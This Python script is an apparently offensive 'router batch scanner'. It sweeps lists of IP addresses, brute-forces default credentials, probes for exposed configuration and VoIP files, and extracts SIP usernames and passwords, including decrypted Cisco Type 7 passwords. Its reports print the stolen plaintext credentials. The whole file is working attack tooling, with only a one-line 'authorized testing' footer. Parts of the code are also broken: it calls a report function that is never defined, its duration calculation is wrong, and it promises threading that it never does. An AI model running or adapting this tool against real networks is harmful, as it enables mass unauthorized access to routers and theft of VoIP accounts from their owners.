#!/usr/bin/env python3
"""
Router Batch Scanner v12.0 - Professional Edition
Advanced Batch Router Vulnerability Assessment and SIP Extraction

Perfect for POC demonstrations - scans multiple routers and extracts SIP passwords.

Features:
- Batch processing from IP file list
- Concurrent scanning with threading
- Unauthenticated vulnerability exploitation
- SIP/VoIP password extraction
- Professional POC reporting
- Real-time progress tracking

Usage:
  python router_batch_scanner.py --file router_ips.txt --report poc_assessment.txt
  python router_batch_scanner.py 192.168.1.1 --verbose
"""

import os
import sys
import re
import json
import argparse
import platform
import socket
import threading
import time
import subprocess
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime
import urllib.request
import urllib.parse
from urllib.error import URLError
import concurrent.futures

# Optional libraries
try:
    import requests
    from requests.auth import HTTPBasicAuth
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

class RouterBatchScanner:
    """Professional batch router vulnerability scanner"""
    
    def __init__(self):
        self.version = "12.0 Professional"
        
        # Vulnerability database
        self.vulnerabilities = {
            'config_exposure': {
                'endpoints': [
                    '/cgi-bin/config.exp',
                    '/config.xml',
                    '/backup.conf',
                    '/settings.conf',
                    '/running-config',
                    '/startup-config'
                ],
                'indicators': ['hostname', 'interface', 'password', 'version']
            },
            'sip_exposure': {
                'endpoints': [
                    '/voip.xml',
                    '/voice.xml',
                    '/sip.conf',
                    '/cgi-bin/voip_config',
                    '/admin/voip.asp',
                    '/userRpm/VoipConfigRpm.htm'
                ],
                'indicators': ['sip', 'voip', 'username', 'password', 'registrar']
            },
            'info_disclosure': {
                'endpoints': [
                    '/system-info',
                    '/device-info',
                    '/status.xml',
                    '/api/system/info'
                ],
                'indicators': ['model', 'version', 'serial', 'mac']
            }
        }
        
        # Default credentials
        self.credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', ''),
            ('root', 'root'), ('root', 'admin'), ('user', 'user'),
            ('cisco', 'cisco'), ('admin', '123456'), ('admin', 'admin123')
        ]
        
        # Router signatures
        self.router_brands = {
            'cisco': ['cisco', 'ios', 'catalyst'],
            'tplink': ['tp-link', 'tl-', 'archer'],
            'dlink': ['d-link', 'dir-', 'di-'],
            'netcomm': ['netcomm', 'nf-', 'nl-'],
            'asus': ['asus', 'rt-', 'asuswrt'],
            'netgear': ['netgear', 'r6000', 'r7000'],
            'linksys': ['linksys', 'wrt', 'ea-'],
            'mikrotik': ['mikrotik', 'routeros', 'winbox']
        }
        
        # Cisco Type 7 table
        self.cisco_type7_xlat = [
            0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c, 0x2e,
            0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44,
            0x48, 0x53, 0x55, 0x42, 0x73, 0x67, 0x76, 0x63, 0x61, 0x36, 0x39,
            0x38, 0x33, 0x34, 0x6e, 0x63, 0x78, 0x76, 0x39, 0x38, 0x37, 0x33,
            0x32, 0x35, 0x34, 0x6b, 0x3b, 0x66, 0x67, 0x38, 0x37
        ]
    
    def scan_single_router(self, ip: str, verbose: bool = False) -> Dict[str, Any]:
        """Scan single router for vulnerabilities and SIP config"""
        result = {
            'ip': ip,
            'reachable': False,
            'router_detected': False,
            'brand': 'unknown',
            'vulnerabilities': [],
            'authentication_bypassed': False,
            'sip_extracted': False,
            'sip_accounts': [],
            'scan_time': 0
        }
        
        start_time = time.time()
        
        # Step 1: Connectivity check
        if verbose:
            print(f"   🔍 Testing connectivity to {ip}...")
        
        if not self._check_reachability(ip):
            result['error'] = 'Not reachable'
            return result
        
        result['reachable'] = True
        
        # Step 2: Router identification
        if verbose:
            print(f"   🔍 Identifying router at {ip}...")
        
        router_info = self._identify_router_brand(ip)
        result.update(router_info)
        
        # Step 3: Vulnerability testing
        if verbose:
            print(f"   🔍 Testing vulnerabilities...")
        
        vulns = self._test_vulnerabilities(ip, verbose)
        result['vulnerabilities'] = vulns
        
        # Step 4: Authentication bypass attempts
        if verbose:
            print(f"   🔍 Testing authentication bypass...")
        
        auth_result = self._test_authentication_bypass(ip, verbose)
        if auth_result['success']:
            result['authentication_bypassed'] = True
            result['access_method'] = auth_result['method']
            result['credentials_used'] = auth_result.get('credentials')
        
        # Step 5: SIP extraction
        if result['authentication_bypassed'] or vulns:
            if verbose:
                print(f"   🔍 Extracting SIP configuration...")
            
            sip_result = self._extract_sip_configuration(ip, auth_result, verbose)
            if sip_result['found']:
                result['sip_extracted'] = True
                result['sip_accounts'] = sip_result['accounts']
        
        result['scan_time'] = time.time() - start_time
        return result
    
    def _check_reachability(self, ip: str) -> bool:
        """Quick connectivity check"""
        try:
            # Try to connect to common router ports
            for port in [80, 443, 23, 22]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    if result == 0:
                        return True
                except:
                    continue
            return False
        except:
            return False
    
    def _identify_router_brand(self, ip: str) -> Dict[str, Any]:
        """Identify router brand and model"""
        router_info = {
            'router_detected': False,
            'brand': 'unknown',
            'model': 'unknown',
            'web_interface': False
        }
        
        # Try HTTP access
        for protocol in ['http', 'https']:
            try:
                url = f"{protocol}://{ip}"
                
                if REQUESTS_AVAILABLE:
                    response = requests.get(url, timeout=3, verify=False)
                    content = response.text.lower()
                else:
                    response = urllib.request.urlopen(url, timeout=3)
                    content = response.read().decode('utf-8', errors='ignore').lower()
                
                router_info['web_interface'] = True
                
                # Check for router signatures
                for brand, signatures in self.router_brands.items():
                    for signature in signatures:
                        if signature in content:
                            router_info['brand'] = brand
                            router_info['router_detected'] = True
                            break
                    if router_info['router_detected']:
                        break
                
                break
                
            except:
                continue
        
        return router_info
    
    def _test_vulnerabilities(self, ip: str, verbose: bool) -> List[Dict[str, Any]]:
        """Test known vulnerabilities"""
        vulnerabilities_found = []
        
        for vuln_name, vuln_info in self.vulnerabilities.items():
            for endpoint in vuln_info['endpoints']:
                try:
                    url = f"http://{ip}{endpoint}"
                    
                    if REQUESTS_AVAILABLE:
                        response = requests.get(url, timeout=3)
                        content = response.text
                        status = response.status_code
                    else:
                        response = urllib.request.urlopen(url, timeout=3)
                        content = response.read().decode('utf-8', errors='ignore')
                        status = response.status
                    
                    if status == 200:
                        # Check for indicators
                        indicators = vuln_info['indicators']
                        found_indicators = sum(1 for ind in indicators if ind.lower() in content.lower())
                        
                        if found_indicators >= 2:
                            vulnerabilities_found.append({
                                'type': vuln_name,
                                'endpoint': endpoint,
                                'indicators_found': found_indicators,
                                'content_sample': content[:200]
                            })
                            
                            if verbose:
                                print(f"      ✅ Vulnerable: {endpoint}")
                            break  # Found vulnerability for this type
                
                except:
                    continue
        
        return vulnerabilities_found
    
    def _test_authentication_bypass(self, ip: str, verbose: bool) -> Dict[str, Any]:
        """Test authentication bypass methods"""
        auth_result = {'success': False, 'method': '', 'credentials': None}
        
        # Method 1: Default credentials
        for username, password in self.credentials:
            try:
                if REQUESTS_AVAILABLE:
                    response = requests.get(f"http://{ip}/", 
                                          auth=HTTPBasicAuth(username, password), 
                                          timeout=3)
                    
                    if (response.status_code == 200 and 
                        'unauthorized' not in response.text.lower()):
                        
                        auth_result = {
                            'success': True,
                            'method': 'default_credentials',
                            'credentials': (username, password)
                        }
                        
                        if verbose:
                            print(f"         ✅ Default credentials work: {username}/{password}")
                        return auth_result
                
            except:
                continue
        
        # Method 2: Unauthenticated access
        try:
            if REQUESTS_AVAILABLE:
                response = requests.get(f"http://{ip}/admin/", timeout=3)
            else:
                response = urllib.request.urlopen(f"http://{ip}/admin/", timeout=3)
            
            if hasattr(response, 'status_code'):
                status = response.status_code
            else:
                status = response.status
            
            if status == 200:
                auth_result = {
                    'success': True,
                    'method': 'unauthenticated_access',
                    'credentials': None
                }
                
                if verbose:
                    print(f"         ✅ Unauthenticated access available")
        
        except:
            pass
        
        return auth_result
    
    def _extract_sip_configuration(self, ip: str, auth_result: Dict, verbose: bool) -> Dict[str, Any]:
        """Extract SIP configuration from router"""
        sip_result = {'found': False, 'accounts': []}
        
        # SIP endpoints to try
        sip_endpoints = [
            '/voip.xml', '/voice.xml', '/sip.conf',
            '/cgi-bin/voip_config', '/admin/voip.asp',
            '/userRpm/VoipConfigRpm.htm', '/phone.xml'
        ]
        
        # Setup authentication if available
        auth = None
        if auth_result.get('credentials'):
            username, password = auth_result['credentials']
            if REQUESTS_AVAILABLE:
                auth = HTTPBasicAuth(username, password)
        
        for endpoint in sip_endpoints:
            try:
                url = f"http://{ip}{endpoint}"
                
                if REQUESTS_AVAILABLE:
                    if auth:
                        response = requests.get(url, auth=auth, timeout=3)
                    else:
                        response = requests.get(url, timeout=3)
                    content = response.text
                else:
                    # Fallback method
                    if auth_result.get('credentials'):
                        username, password = auth_result['credentials']
                        password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
                        password_mgr.add_password(None, url, username, password)
                        auth_handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
                        opener = urllib.request.build_opener(auth_handler)
                        response = opener.open(url, timeout=3)
                    else:
                        response = urllib.request.urlopen(url, timeout=3)
                    
                    content = response.read().decode('utf-8', errors='ignore')
                
                # Extract SIP accounts
                sip_accounts = self._parse_sip_content(content, verbose)
                if sip_accounts:
                    sip_result['found'] = True
                    sip_result['accounts'].extend(sip_accounts)
                    
                    if verbose:
                        print(f"         ✅ SIP data found at {endpoint}: {len(sip_accounts)} accounts")
            
            except:
                continue
        
        return sip_result
    
    def _parse_sip_content(self, content: str, verbose: bool) -> List[Dict[str, Any]]:
        """Parse SIP accounts from content"""
        sip_accounts = []
        
        # SIP extraction patterns
        patterns = [
            # Username patterns
            (r'sip[._\s]*username[=:\s]*["\']?([^"\'>\s\n]+)', 'username'),
            (r'voip[._\s]*username[=:\s]*["\']?([^"\'>\s\n]+)', 'username'),
            (r'account[._\s]*username[=:\s]*["\']?([^"\'>\s\n]+)', 'username'),
            (r'extension[=:\s]*["\']?(\d{3,5})', 'extension'),
            
            # Password patterns
            (r'sip[._\s]*password[=:\s]*["\']?([^"\'>\s\n]+)', 'password'),
            (r'voip[._\s]*password[=:\s]*["\']?([^"\'>\s\n]+)', 'password'),
            (r'account[._\s]*password[=:\s]*["\']?([^"\'>\s\n]+)', 'password'),
            (r'password\s+7\s+([A-Fa-f0-9]+)', 'cisco_type7'),
            
            # Server patterns
            (r'registrar[=:\s]*["\']?([^"\'>\s\n]+)', 'server'),
            (r'proxy[=:\s]*["\']?([^"\'>\s\n]+)', 'server'),
            (r'sip[._\s]*server[=:\s]*["\']?([^"\'>\s\n]+)', 'server'),
            (r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})', 'server_ip')
        ]
        
        for pattern, sip_type in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            
            for match in matches:
                if len(match) > 2:
                    account_info = {
                        'type': sip_type,
                        'value': match,
                        'source': 'web_interface'
                    }
                    
                    # Handle Cisco Type 7
                    if sip_type == 'cisco_type7':
                        decrypted = self._decrypt_cisco_type7(match)
                        account_info['encrypted'] = match
                        account_info['decrypted'] = decrypted
                        account_info['type'] = 'password'
                    
                    sip_accounts.append(account_info)
        
        return sip_accounts
    
    def _decrypt_cisco_type7(self, password: str) -> str:
        """Decrypt Cisco Type 7 password"""
        try:
            if len(password) < 4:
                return "Invalid"
            
            salt = int(password[:2])
            encrypted_text = password[2:]
            encrypted_bytes = bytes.fromhex(encrypted_text)
            
            decrypted = ""
            for i, byte in enumerate(encrypted_bytes):
                key_index = (salt + i) % len(self.cisco_type7_xlat)
                decrypted += chr(byte ^ self.cisco_type7_xlat[key_index])
            
            return decrypted
        except:
            return "Failed"
    
    def batch_scan(self, ip_list: List[str], verbose: bool = False) -> Dict[str, Any]:
        """Perform batch scanning of multiple routers"""
        print(f"🔥 Router Batch Scanner v{self.version}")
        print(f"🎯 Professional Vulnerability Assessment")
        print("=" * 80)
        print(f"📊 Targets: {len(ip_list)} routers")
        print(f"⏱️ Started: {datetime.now().strftime('%H:%M:%S')}")
        print("")
        
        batch_results = {
            'start_time': datetime.now().isoformat(),
            'total_targets': len(ip_list),
            'results': {},
            'summary': {
                'reachable': 0,
                'vulnerable': 0,
                'sip_extracted': 0,
                'secure': 0,
                'unreachable': 0
            },
            'sip_accounts_total': 0
        }
        
        # Scan each IP
        for i, ip in enumerate(ip_list, 1):
            print(f"📡 [{i:3d}/{len(ip_list)}] Scanning {ip}...", end=' ')
            
            try:
                result = self.scan_single_router(ip, verbose=False)
                batch_results['results'][ip] = result
                
                # Update summary
                if result['reachable']:
                    batch_results['summary']['reachable'] += 1
                    
                    if result['authentication_bypassed'] or result['vulnerabilities']:
                        batch_results['summary']['vulnerable'] += 1
                        
                        if result['sip_extracted']:
                            batch_results['summary']['sip_extracted'] += 1
                            batch_results['sip_accounts_total'] += len(result['sip_accounts'])
                            print("🎯 VULNERABLE + SIP")
                        else:
                            print("⚠️ VULNERABLE")
                    else:
                        batch_results['summary']['secure'] += 1
                        print("🛡️ SECURE")
                else:
                    batch_results['summary']['unreachable'] += 1
                    print("📵 UNREACHABLE")
            
            except Exception as e:
                print(f"❌ ERROR: {e}")
                batch_results['results'][ip] = {'error': str(e)}
            
            # Progress indicator
            if i % 10 == 0 or i == len(ip_list):
                progress = (i / len(ip_list)) * 100
                print(f"\n📈 Progress: {progress:.1f}% complete")
        
        batch_results['end_time'] = datetime.now().isoformat()
        batch_results['duration'] = time.time() - time.time()  # Will be calculated properly
        
        return batch_results
    
    def generate_professional_report(self, batch_results: Dict[str, Any]) -> str:
        """Generate professional batch assessment report"""
        report = []
        
        # Header
        report.append("=" * 120)
        report.append("PROFESSIONAL ROUTER SECURITY ASSESSMENT - BATCH ANALYSIS REPORT")
        report.append("Advanced Vulnerability Testing and SIP Configuration Extraction")
        report.append("=" * 120)
        report.append(f"Assessment Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Total Targets Assessed: {batch_results.get('total_targets', 0)}")
        report.append(f"Assessment Tool: Router Batch Scanner v{self.version}")
        report.append("")
        
        # Executive Summary
        summary = batch_results.get('summary', {})
        
        report.append("🎯 EXECUTIVE SUMMARY")
        report.append("-" * 80)
        report.append(f"Reachable Routers: {summary.get('reachable', 0)}")
        report.append(f"Vulnerable Routers: {summary.get('vulnerable', 0)}")
        report.append(f"SIP Configurations Extracted: {summary.get('sip_extracted', 0)}")
        report.append(f"Total SIP Accounts Found: {batch_results.get('sip_accounts_total', 0)}")
        report.append(f"Secure Routers: {summary.get('secure', 0)}")
        report.append(f"Unreachable Targets: {summary.get('unreachable', 0)}")
        
        # Risk calculation
        total_reachable = summary.get('reachable', 1)
        vulnerability_rate = (summary.get('vulnerable', 0) / total_reachable) * 100 if total_reachable > 0 else 0
        
        report.append(f"Network Vulnerability Rate: {vulnerability_rate:.1f}%")
        
        if vulnerability_rate > 50:
            report.append("🔴 CRITICAL SECURITY RISK")
        elif vulnerability_rate > 25:
            report.append("🟠 HIGH SECURITY RISK")
        elif vulnerability_rate > 10:
            report.append("🟡 MEDIUM SECURITY RISK")
        else:
            report.append("🟢 LOW SECURITY RISK")
        
        report.append("")
        
        # Detailed Findings
        vulnerable_ips = []
        sip_enabled_ips = []
        
        for ip, result in batch_results.get('results', {}).items():
            if result.get('authentication_bypassed') or result.get('vulnerabilities'):
                vulnerable_ips.append((ip, result))
            
            if result.get('sip_extracted'):
                sip_enabled_ips.append((ip, result))
        
        # Vulnerable routers section
        if vulnerable_ips:
            report.append(f"🔓 VULNERABLE ROUTERS DETAILED ANALYSIS ({len(vulnerable_ips)})")
            report.append("-" * 80)
            
            for ip, result in vulnerable_ips:
                brand = result.get('brand', 'Unknown').upper()
                report.append(f"Router: {ip} ({brand})")
                
                if result.get('credentials_used'):
                    creds = result['credentials_used']
                    report.append(f"  Access Method: Default credentials ({creds[0]}/{creds[1]})")
                else:
                    report.append(f"  Access Method: {result.get('access_method', 'Unknown')}")
                
                vulnerabilities = result.get('vulnerabilities', [])
                if vulnerabilities:
                    report.append(f"  Vulnerabilities: {len(vulnerabilities)}")
                    for vuln in vulnerabilities:
                        report.append(f"    • {vuln['type']}: {vuln['endpoint']}")
                
                report.append("")
        
        # SIP extraction results
        if sip_enabled_ips:
            report.append(f"📞 SIP/VOIP CONFIGURATION EXTRACTION RESULTS ({len(sip_enabled_ips)})")
            report.append("-" * 80)
            
            for ip, result in sip_enabled_ips:
                sip_accounts = result.get('sip_accounts', [])
                brand = result.get('brand', 'Unknown').upper()
                
                report.append(f"Router: {ip} ({brand}) - {len(sip_accounts)} SIP accounts")
                
                # Group SIP data
                usernames = [acc for acc in sip_accounts if acc['type'] in ['username', 'extension']]
                passwords = [acc for acc in sip_accounts if acc['type'] == 'password']
                servers = [acc for acc in sip_accounts if acc['type'] in ['server', 'server_ip']]
                
                if usernames:
                    user_values = [u['value'] for u in usernames]
                    report.append(f"  SIP Users: {', '.join(user_values)}")
                
                if passwords:
                    pass_values = []
                    for p in passwords:
                        if p.get('decrypted'):
                            pass_values.append(f"{p['decrypted']} (Type7)")
                        else:
                            pass_values.append(p['value'])
                    report.append(f"  SIP Passwords: {', '.join(pass_values)}")
                
                if servers:
                    server_values = [s['value'] for s in servers]
                    report.append(f"  SIP Servers: {', '.join(server_values)}")
                
                report.append("")
        
        # POC Value Assessment
        report.append("🎯 POC DEMONSTRATION VALUE ASSESSMENT")
        report.append("-" * 80)
        
        if batch_results.get('sip_accounts_total', 0) > 0:
            report.append("✅ EXCELLENT POC VALUE")
            report.append(f"• {summary.get('sip_extracted', 0)} routers with extracted SIP credentials")
            report.append(f"• {batch_results['sip_accounts_total']} total SIP accounts recovered")
            report.append(f"• {summary.get('vulnerable', 0)} vulnerable routers identified")
            report.append("• Perfect demonstration of network security risks")
            report.append("• Real VoIP credentials extracted for client presentation")
        elif summary.get('vulnerable', 0) > 0:
            report.append("⚠️ GOOD POC VALUE")
            report.append(f"• {summary.get('vulnerable', 0)} vulnerable routers discovered")
            report.append("• Security vulnerabilities successfully demonstrated")
            report.append("• Shows critical need for security assessment services")
        else:
            report.append("ℹ️ EDUCATIONAL POC VALUE")
            report.append("• Network demonstrates good security posture")
            report.append("• Shows thoroughness of professional security testing")
            report.append("• Validates current security implementations")
        
        # Professional Recommendations
        report.append("")
        report.append("💡 PROFESSIONAL SECURITY RECOMMENDATIONS")
        report.append("-" * 80)
        
        if summary.get('vulnerable', 0) > 0:
            report.append("IMMEDIATE ACTIONS REQUIRED:")
            report.append("1. Change default credentials on all vulnerable routers")
            report.append("2. Disable unnecessary web services and endpoints")
            report.append("3. Implement network access controls for router management")
            report.append("4. Enable HTTPS and disable HTTP for web management")
            report.append("5. Regular firmware updates and security patches")
            report.append("6. Monitor router access logs for unauthorized attempts")
        
        if batch_results.get('sip_accounts_total', 0) > 0:
            report.append("")
            report.append("SIP/VOIP SECURITY RECOMMENDATIONS:")
            report.append("1. Secure SIP account passwords with strong authentication")
            report.append("2. Implement SIP encryption (SRTP/TLS)")
            report.append("3. Restrict VoIP traffic to authorized networks")
            report.append("4. Regular SIP account auditing and password rotation")
        
        # Footer
        report.append("")
        report.append("=" * 120)
        report.append(f"Router Batch Scanner v{self.version} - Professional Security Assessment")
        report.append("FOR AUTHORIZED PENETRATION TESTING AND SECURITY ASSESSMENT ONLY")
        report.append("=" * 120)
        
        return '\n'.join(report)


def main():
    """Main function with batch processing support"""
    parser = argparse.ArgumentParser(
        description='Router Batch Scanner v12.0 - Professional Security Assessment',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
🔥 PROFESSIONAL BATCH SCANNING:
• Scan multiple routers from IP file list
• Extract SIP passwords automatically  
• Generate comprehensive security reports
• Perfect for large-scale POC demonstrations

📋 USAGE EXAMPLES:
  Batch from file:
    python router_batch_scanner.py --file router_ips.txt --report security_assessment.txt -v
    
  Single router:
    python router_batch_scanner.py 192.168.1.1 -v
    
  Auto-detect file:
    python router_batch_scanner.py ip_list.txt --batch -v
    
  Decrypt password:
    python router_batch_scanner.py --password "094F471A1A0A"

📁 IP FILE FORMAT:
Create a text file with one IP per line:
192.168.1.1
192.168.0.1  
10.0.0.1
172.16.1.1

🎯 PERFECT FOR POC DEMONSTRATIONS
        """
    )
    
    parser.add_argument('target', nargs='?', help='Single IP address OR file containing IP list')
    parser.add_argument('-f', '--file', help='File containing list of IP addresses')
    parser.add_argument('-p', '--password', help='Decrypt Cisco Type 7 password')
    parser.add_argument('-r', '--report', help='Generate professional assessment report')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--batch', action='store_true', help='Treat target as file (auto-detect)')
    parser.add_argument('--json', action='store_true', help='JSON output format')
    
    args = parser.parse_args()
    
    scanner = RouterBatchScanner()
    
    # Password decryption
    if args.password:
        decrypted = scanner._decrypt_cisco_type7(args.password)
        print(f"🔑 Encrypted: {args.password}")
        print(f"🔓 Decrypted: {decrypted}")
        return
    
    # Determine IP list
    ip_list = []
    
    if args.file:
        # Read from specified file
        try:
            with open(args.file, 'r') as f:
                ip_list = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            print(f"📁 Loaded {len(ip_list)} IP addresses from {args.file}")
        except Exception as e:
            print(f"❌ Error reading file {args.file}: {e}")
            return
    
    elif args.target:
        if args.batch or os.path.exists(args.target):
            # Target is a file
            try:
                with open(args.target, 'r') as f:
                    ip_list = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print(f"📁 Loaded {len(ip_list)} IP addresses from {args.target}")
            except Exception as e:
                # Not a file, treat as single IP
                try:
                    socket.inet_aton(args.target)
                    ip_list = [args.target]
                except socket.error:
                    print(f"❌ Invalid IP address: {args.target}")
                    return
        else:
            # Single IP
            try:
                socket.inet_aton(args.target)
                ip_list = [args.target]
            except socket.error:
                print(f"❌ Invalid IP address: {args.target}")
                return
    
    else:
        # No target specified
        print("Router Batch Scanner v12.0 - Professional Edition")
        print("")
        print("Usage Examples:")
        print("  Single IP:    python router_batch_scanner.py 192.168.1.1 -v")
        print("  Batch file:   python router_batch_scanner.py --file ip_list.txt --report assessment.txt")
        print("  Auto-detect:  python router_batch_scanner.py ip_list.txt --batch -v")
        print("  Decrypt:      python router_batch_scanner.py --password '094F471A1A0A'")
        print("")
        print("Create IP file format:")
        print("  192.168.1.1")
        print("  192.168.0.1")
        print("  10.0.0.1")
        print("  # Comments start with #")
        return
    
    if not ip_list:
        print("❌ No valid IP addresses to scan")
        return
    
    # Perform scanning
    if len(ip_list) == 1:
        # Single IP detailed scan
        print(f"🎯 Single router assessment: {ip_list[0]}")
        result = scanner.scan_single_router(ip_list[0], args.verbose)
        
        # Generate single router report
        single_report = scanner.generate_single_report(result)
        print(single_report)
        
        if args.report:
            with open(args.report, 'w', encoding='utf-8') as f:
                f.write(single_report)
            print(f"\n💾 Assessment report saved: {args.report}")
    
    else:
        # Batch scanning
        batch_results = scanner.batch_scan(ip_list, args.verbose)
        
        # Output results
        if args.json:
            print(json.dumps(batch_results, indent=2, default=str))
        else:
            report = scanner.generate_professional_report(batch_results)
            print("\n" + report)
        
        # Save report
        if args.report:
            report = scanner.generate_professional_report(batch_results)
            with open(args.report, 'w', encoding='utf-8') as f:
                f.write(report)
            print(f"\n💾 Batch assessment report saved: {args.report}")
        
        # Final summary
        print(f"\n🎉 BATCH ASSESSMENT COMPLETE!")
        print(f"🔓 Vulnerable routers: {batch_results['summary']['vulnerable']}")
        print(f"📞 SIP extractions: {batch_results['summary']['sip_extracted']}")
        print(f"🎯 Total SIP accounts: {batch_results['sip_accounts_total']}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n🔥 BATCH SCANNING TERMINATED BY USER")
    except Exception as e:
        print(f"\n💥 CRITICAL ERROR: {e}")
        sys.exit(1)